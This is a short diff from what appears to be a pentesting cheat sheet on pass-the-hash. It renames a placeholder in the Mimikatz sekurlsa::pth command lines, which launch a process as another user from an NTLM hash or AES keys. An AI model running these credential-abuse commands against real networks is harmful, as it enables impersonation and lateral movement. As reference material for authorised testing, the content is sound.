@@ -135,7 +135,8 @@ under another user identity using its `NTLM` hash.
 # Default to /run:cmd.exe.
 # Command can be any binary such as powershell.exe or mmc.exe for example.
 # Specifying arguments is supported as well.
-sekurlsa::pth /domain:<. | DOMAIN_FQDN> /user:<USERNAME> /ntlm:<NT_HASH> /run:"<COMMAND>"
+
+sekurlsa::pth /domain:<. | DOMAIN_FQDN> /user:<USERNAME> /ntlm:<HASH_NTLM> /run:"<COMMAND>"
 sekurlsa::pth /domain:<. | DOMAIN_FQDN> /user:<USERNAME> [/aes128:<USER_AES128_KEY> | /aes256:<USER_AES256_KEY>] /run:"<COMMAND>"
 ```
 
